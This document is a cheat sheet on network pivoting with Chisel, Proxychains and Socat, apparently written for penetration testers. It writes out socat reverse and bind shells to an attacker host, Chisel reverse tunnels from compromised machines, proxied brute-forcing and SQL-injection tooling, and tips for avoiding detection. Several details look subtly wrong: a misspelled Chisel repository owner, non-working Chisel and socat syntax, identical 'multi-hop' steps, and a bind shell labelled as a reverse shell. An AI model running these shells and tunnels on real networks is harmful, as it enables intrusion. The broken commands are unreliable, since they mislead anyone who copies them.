# Pivoting with Chisel, Proxychains and Socat Cheat Sheet

## Overview

Pivoting is the technique of using a compromised system to access other systems on the network. These tools help you:

- Establish tunnels through compromised hosts.
- Route traffic through multiple hops.
- Access internal networks from outside.
- Bypass network segmentation.
- Conduct authorized security assessments.

**Chisel**: Fast TCP/UDP tunnel over HTTP.
**Proxychains**: Force applications through proxy servers.
**Socat**: Multipurpose relay tool for network connections.

```text
Use these tools only against systems you own or are explicitly authorized to test.
```

---

# 1. Chisel - TCP/UDP Tunnel over HTTP

## Overview

Chisel is a fast TCP/UDP tunnel over HTTP, secured by SSH. It's ideal for:

- Creating reverse tunnels from compromised hosts.
- Forwarding ports through firewalls.
- Establishing SOCKS proxies.
- Pivoting through multiple hosts.

## Installation

### Install on attacker machine

```bash
# Download from GitHub
wget https://github.com/jpillows/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.gz
gzip -d chisel_1.10.0_linux_amd64.gz
chmod +x chisel
mv chisel /usr/local/bin/
```

### Install on target machine

Same process, or use static binary if target has no package manager.

## Starting Chisel Server

### Basic server

```bash
chisel server --port 8080 --reverse
```

### Server with authentication

```bash
chisel server --port 8080 --reverse --auth user:password
```

### Server with multiple users

```bash
chisel server --port 8080 --reverse --auth user1:pass1 --auth user2:pass2
```

### Server with logging

```bash
chisel server --port 8080 --reverse --log-level debug
```

## Starting Chisel Client

### Basic client (reverse tunnel)

```bash
chisel client http://<server-ip>:8080 R:socks
```

This creates a SOCKS proxy on the server side.

### Client with specific port forwarding

```bash
chisel client http://<server-ip>:8080 R:3389:192.168.1.10:3389
```

Forwards RDP from 192.168.1.10 through the tunnel.

### Client with multiple forwards

```bash
chisel client http://<server-ip>:8080 R:3389:192.168.1.10:3389 R:22:192.168.1.20:22
```

### Client with authentication

```bash
chisel client http://user:password@<server-ip>:8080 R:socks
```

### Client in foreground mode

```bash
chisel client http://<server-ip>:8080 R:socks --foreground
```

## Common Chisel Scenarios

### Create SOCKS proxy through compromised host

**On attacker machine (server):**

```bash
chisel server --port 8080 --reverse
```

**On compromised host (client):**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

**Use proxy with proxychains:**

```bash
proxychains nmap -sT 192.168.1.0/24
```

### Forward specific port

**On attacker machine:**

```bash
chisel server --port 8080 --reverse
```

**On compromised host:**

```bash
chisel client http://<attacker-ip>:8080 R:3306:192.168.1.50:3306
```

Now connect to localhost:3306 to reach MySQL on 192.168.1.50.

### Multi-hop pivoting

**First hop:**

```bash
# On first compromised host
chisel client http://<attacker-ip>:8080 R:socks
```

**Second hop through first:**

```bash
# On second compromised host
chisel client http://<attacker-ip>:8080 R:socks
```

### Reverse shell through Chisel

**On attacker machine:**

```bash
chisel server --port 8080 --reverse
```

**On compromised host:**

```bash
chisel client http://<attacker-ip>:8080 R:4444:127.0.0.1:4444
```

Then start netcat listener on attacker.

---

# 2. Proxychains - Force Applications Through Proxy

## Overview

Proxychains forces applications to use proxy servers (SOCKS4, SOCKS5, HTTP). It's ideal for:

- Routing traffic through compromised hosts.
- Bypassing network restrictions.
- Hiding your real IP address.
- Pivoting through multiple proxies.

## Installation

### Install on Debian/Ubuntu

```bash
sudo apt update
sudo apt install proxychains -y
```

### Install from source

```bash
git clone https://github.com/haad/proxychains.git
cd proxychains/proxychains
./configure
make
sudo make install
```

## Configuration

### Edit configuration file

```bash
sudo nano /etc/proxychains/proxychains.conf
```

### Basic configuration

```ini
[ProxyList]
socks5 127.0.0.1 1080
```

### Multiple proxies (chain)

```ini
[ProxyList]
socks5 127.0.0.1 1080
socks5 192.168.1.10 1080
http 192.168.1.20 8080
```

### Enable DNS leak protection

```ini
proxy_dns
```

Add this before [ProxyList] section.

### Enable quiet mode

```ini
quiet_mode
```

Reduces output verbosity.

## Using Proxychains

### Basic usage

```bash
proxychains <command>
```

Example:

```bash
proxychains nmap -sT 192.168.1.10
```

### Force proxychains

```bash
proxychains -f <config-file> <command>
```

Example:

```bash
proxychains -f /etc/proxychains/proxychains.conf nmap -sT 192.168.1.10
```

### With Chisel SOCKS proxy

**Start Chisel:**

```bash
chisel client http://<server-ip>:8080 R:socks
```

**Use with proxychains:**

```bash
proxychains nmap -sT 192.168.1.0/24
```

### Common commands with proxychains

```bash
# Nmap scan
proxychains nmap -sT 192.168.1.10

# SSH connection
proxychains ssh user@192.168.1.10

# Curl request
proxychains curl http://192.168.1.10

# Metasploit
proxychains msfconsole

# SQLMap
proxychains sqlmap -u http://192.168.1.10/vuln.php?id=1

# WPScan
proxychains wpscan -u http://192.168.1.10/

# Hydra
proxychains hydra -L users.txt -P passwords.txt 192.168.1.10 ssh
```

## Proxychains Configuration Examples

### Single SOCKS5 proxy

```ini
[ProxyList]
socks5 127.0.0.1 1080
```

### SOCKS5 with authentication

```ini
[ProxyList]
socks5 127.0.0.1 1080 user password
```

### HTTP proxy

```ini
[ProxyList]
http 127.0.0.1 8080
```

### Multiple proxies in chain

```ini
[ProxyList]
socks5 127.0.0.1 1080
socks5 192.168.1.10 1080
http 192.168.1.20 8080
```

### Random chain

```ini
chain_len = 2
random_chain
```

---

# 3. Socat - Multipurpose Network Relay

## Overview

Socat (SOcket CAT) is a multipurpose relay tool for network connections. It's ideal for:

- Port forwarding.
- Creating reverse shells.
- Bridging network connections.
- Converting between protocols.
- Pivoting through compromised hosts.

## Installation

### Install on Debian/Ubuntu

```bash
sudo apt update
sudo apt install socat -y
```

### Install on CentOS/RHEL

```bash
sudo yum install socat -y
```

### Install on macOS

```bash
brew install socat
```

## Basic Socat Usage

### Listen on port

```bash
socat TCP-LISTEN:4444 -
```

### Connect to port

```bash
socat TCP:<target-ip>:4444 -
```

### Forward port to another port

```bash
socat TCP-LISTEN:8080 TCP:<target-ip>:80
```

### Forward with exec

```bash
socat TCP-LISTEN:4444 EXEC:/bin/bash
```

## Socat for Pivoting

### Create reverse shell

**On attacker machine:**

```bash
socat TCP-LISTEN:4444 -
```

**On compromised host:**

```bash
socat TCP:<attacker-ip>:4444 EXEC:/bin/bash
```

### Port forwarding through compromised host

**On compromised host:**

```bash
socat TCP-LISTEN:8080 TCP:192.168.1.50:80
```

Now connect to compromised-host:8080 to reach 192.168.1.50:80.

### Create SOCKS proxy

**On compromised host:**

```bash
socat TCP-LISTEN:1080 SOCKS:192.168.1.50:80
```

### Bidirectional forwarding

**On compromised host:**

```bash
socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.50:80
```

The `reuseaddr,fork` options allow multiple connections.

### UDP to TCP bridge

```bash
socat UDP-LISTEN:53 TCP:192.168.1.50:53
```

### SSL/TLS tunnel

**Server side:**

```bash
socat OPENSSL-LISTEN:443,reuseaddr,fork,cert=server.pem,key=server.key TCP:192.168.1.50:80
```

**Client side:**

```bash
socat TCP-LISTEN:8080,reuseaddr,fork OPENSSL:<server-ip>:443,verify=0
```

## Common Socat Scenarios

### Reverse shell with socat

**On attacker:**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork -
```

**On target:**

```bash
socat TCP:<attacker-ip>:4444 EXEC:/bin/bash
```

### Bind shell with socat

**On target:**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

**Connect from attacker:**

```bash
socat TCP:<target-ip>:4444 -
```

### Port forwarding through multiple hops

**First hop:**

```bash
socat TCP-LISTEN:8080 TCP:<first-hop>:9090
```

**Second hop:**

```bash
socat TCP-LISTEN:9090 TCP:<second-hop>:80
```

### File transfer with socat

**Receiver:**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork OPEN:received_file,creat,trunc
```

**Sender:**

```bash
socat TCP:<receiver-ip>:4444 OPEN:file_to_send
```

### Database tunnel

**On compromised host:**

```bash
socat TCP-LISTEN:3307 TCP:192.168.1.50:3306
```

Now connect to localhost:3307 to reach MySQL on 192.168.1.50:3306.

---

# 4. Combined Pivoting Scenarios

## Scenario 1: Chisel + Proxychains

**Step 1: Start Chisel server on attacker**

```bash
chisel server --port 8080 --reverse
```

**Step 2: Connect from compromised host**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

**Step 3: Use proxychains with tools**

```bash
proxychains nmap -sT 192.168.1.0/24
proxychains ssh user@192.168.1.10
proxychains curl http://192.168.1.10/admin
```

## Scenario 2: Chisel + Socat

**Step 1: Start Chisel server**

```bash
chisel server --port 8080 --reverse
```

**Step 2: Create tunnel from compromised host**

```bash
chisel client http://<attacker-ip>:8080 R:3307:192.168.1.50:3306
```

**Step 3: Use socat for additional forwarding**

```bash
socat TCP-LISTEN:3308 TCP:127.0.0.1:3307
```

## Scenario 3: Multi-hop with Chisel

**First compromised host:**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

**Second compromised host (through first):**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

**Third compromised host (through second):**

```bash
chisel client http://<attacker-ip>:8080 R:socks
```

## Scenario 4: Proxychains chain

**Configure /etc/proxychains/proxychains.conf:**

```ini
[ProxyList]
socks5 127.0.0.1 1080
socks5 192.168.1.10 1080
socks5 192.168.1.20 1080
```

**Use with tools:**

```bash
proxychains nmap -sT 192.168.1.100
```

## Scenario 5: Socat + Chisel combination

**On first compromised host:**

```bash
chisel client http://<attacker-ip>:8080 R:8080:192.168.1.50:80
```

**On attacker machine:**

```bash
socat TCP-LISTEN:80,reuseaddr,fork TCP:127.0.0.1:8080
```

---

# 5. Advanced Pivoting Techniques

## Dynamic Port Forwarding

### With Chisel

```bash
chisel client http://<server-ip>:8080 R:dynamic:1080
```

Creates a dynamic SOCKS proxy on port 1080.

### With SSH

```bash
ssh -D 1080 user@<compromised-host>
```

### With Socat

```bash
socat TCP-LISTEN:1080,reuseaddr,fork SOCKS:192.168.1.50:80
```

## Local Port Forwarding

### With Chisel

```bash
chisel client http://<server-ip>:8080 L:3306:192.168.1.50:3306
```

### With SSH

```bash
ssh -L 3306:192.168.1.50:3306 user@<compromised-host>
```

### With Socat

```bash
socat TCP-LISTEN:3306,reuseaddr,fork TCP:192.168.1.50:3306
```

## Remote Port Forwarding

### With Chisel

```bash
chisel client http://<server-ip>:8080 R:8080:192.168.1.50:80
```

### With SSH

```bash
ssh -R 8080:192.168.1.50:80 user@<attacker-host>
```

### With Socat

```bash
socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.50:80
```

## VPN-like Tunneling

### With Chisel

```bash
# Server
chisel server --port 8080 --reverse --proxy "http://proxy:8080"

# Client
chisel client http://<server-ip>:8080 R:socks
```

### With SSH

```bash
ssh -D 1080 -C user@<compromised-host>
```

The `-C` flag enables compression.

---

# 6. Troubleshooting

## Chisel Issues

### Connection refused

- Check if server is running.
- Verify port is not blocked by firewall.
- Ensure correct IP address.

### Authentication failed

- Verify username and password.
- Check for typos in credentials.
- Ensure server has correct auth configured.

### Slow performance

- Reduce encryption overhead.
- Check network latency.
- Use compression if available.

## Proxychains Issues

### Connection timeout

- Check proxy server is running.
- Verify proxy configuration.
- Test proxy connectivity manually.

### DNS leaks

- Enable `proxy_dns` in configuration.
- Use `proxychains -f` with correct config.
- Test with `proxychains curl ifconfig.me`.

### Application not working

- Some applications don't work with proxychains.
- Try `proxychains -d` for debug output.
- Use LD_PRELOAD method if needed.

## Socat Issues

### Address already in use

- Use `reuseaddr` option.
- Check if port is already bound.
- Kill existing process on port.

### Connection reset

- Check target is reachable.
- Verify firewall rules.
- Ensure target service is running.

### Permission denied

- Run with appropriate privileges.
- Check SELinux/AppArmor policies.
- Use non-privileged ports (>1024).

---

# 7. Security Best Practices

## Always verify tunnels

- Test connectivity through tunnels.
- Verify data is flowing correctly.
- Monitor for disconnections.
- Have backup access methods.

## Minimize detection

- Use encryption when possible.
- Avoid noisy scanning through tunnels.
- Use appropriate timing.
- Clean up after testing.

## Maintain stability

- Use persistent connections.
- Implement reconnection logic.
- Monitor tunnel health.
- Have fallback options.

## Document everything

- Record tunnel configurations.
- Note which hosts are compromised.
- Track network topology.
- Document findings and methods.

---

# 8. Important Reminders

- Always obtain explicit authorization before pivoting.
- Test in controlled lab environments first.
- Some techniques may trigger security alerts.
- Respect network boundaries and policies.
- Keep tools updated regularly.
- Validate findings manually.
- Document all actions and configurations.
- Preserve original evidence and logs.
- Understand the legal and ethical implications.
- Clean up tunnels after testing.

---

# 9. Quick Reference Commands

## Chisel

```bash
# Start server
chisel server --port 8080 --reverse

# Start client with SOCKS
chisel client http://<server-ip>:8080 R:socks

# Start client with port forward
chisel client http://<server-ip>:8080 R:3389:192.168.1.10:3389
```

## Proxychains

```bash
# Basic usage
proxychains <command>

# Nmap through proxy
proxychains nmap -sT 192.168.1.10

# SSH through proxy
proxychains ssh user@192.168.1.10
```

## Socat

```bash
# Listen on port
socat TCP-LISTEN:4444 -

# Forward port
socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.50:80

# Reverse shell
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

---

# 10. Additional Resources

## Chisel

```text
https://github.com/jpillows/chisel
```

## Proxychains

```text
https://github.com/haad/proxychains
```

## Socat

```text
http://www.dest-unreach.org/socat/
```

## Pivoting Guide

```text
https://www.offensive-security.com/
```

## Network Pivoting Techniques

```text
https://www.sans.org/
```
